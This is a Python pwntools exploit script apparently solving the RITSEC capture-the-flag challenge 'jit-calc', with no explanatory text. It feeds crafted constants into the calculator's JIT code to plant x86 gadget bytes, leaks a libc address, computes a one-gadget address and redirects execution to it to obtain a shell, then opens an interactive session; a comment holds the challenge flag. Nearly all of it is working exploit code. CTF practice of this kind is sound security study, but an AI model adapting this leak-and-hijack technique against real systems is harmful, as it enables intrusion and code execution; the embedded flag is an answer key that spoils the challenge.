from pwn import *
import sys
import time

prog_name = './jit-calc'
context.binary = prog_name
debug = int(sys.argv[1])
online=False

if( debug == 0):
  r = remote("ctfchallenges.ritsec.club", 8000)
  online=True
elif(debug == 1):
  r = process(prog_name)

def halt():
  while True:
    log.info( r.recvline() )

def change_index(index):
  r.recvuntil("4: Run code")
  r.sendline("1")
  r.recvuntil("What index would you like")
  r.sendline(str(index))

def write_code(payload):
  r.recvuntil("4: Run code")
  r.sendline("2")
  cnt=0
  for raw_now in payload:
    cnt += 1
    #print(raw_now)
    r.recvuntil("3: Write Constant Value",timeout=60)
    if raw_now[0] is 1:
      r.sendline("1")
    elif raw_now[0] is 2:
      r.sendline("2")
      r.recvuntil("Add Register 2 to Register 2")
      r.sendline(str(raw_now[1]))
    elif raw_now[0] is 3:
      r.sendline("3")
      r.recvuntil("Store to register 2")
      r.sendline(str(raw_now[1]))
      r.recvuntil("Enter the constant:")
      r.sendline(str(raw_now[2]))
  r.recvuntil("Current index:")

def run_code():
  r.recvuntil("4: Run code")
  r.sendline("4")

def give_up():
  r.recvuntil("4: Run code")
  r.sendline("3")

def interactive():
  if not online:
    print( """/usr/bin/gdb -q  {0} {1}""".format( r.argv[0], r.pid ) )
  r.interactive()

def exploit():
  # 1 leak
  special_chunk = [3,1, 0xc3c88948c3c3c3c3]
  payload1 = [ [2,1] for x in range(328) ] + [ special_chunk ] #0xe2
  payload3 = [ [3,1,0xff] for x in range(99) ] #0xde
  write_code(payload1)
  write_code(payload3)
  run_code()
  r.recvuntil("Result: ")
  leak_1 = int("0x{0}".format(r.recvline().rstrip()), 16)
  libc_base_addr = leak_1 - 7 - 0xf5330 
  one_gadget = 0xe666b + libc_base_addr
  log.info("leak mprotect+7: 0x{0:x}".format(leak_1))
  log.info("libc addr: 0x{0:x}".format(libc_base_addr))
  log.info("one gadget addr: 0x{0:x}".format(one_gadget))
  #
  # 2 pwn
  special_chunk = [3,1, 0xc3d0ff90c3c3c3c3]
  payload1 = [ [2,1] for x in range(328) ] + [ special_chunk ] #0xe2
  payload3 = [ [3,1,0xff] for x in range(98) ] + [[3,2,one_gadget]] #0xde
  write_code(payload1)
  write_code(payload3)

  run_code()
  interactive()  #RITSEC{J1T_c@lC_m0R3_l!Ke_FaNCY_A553mb1y}
  return

exploit()
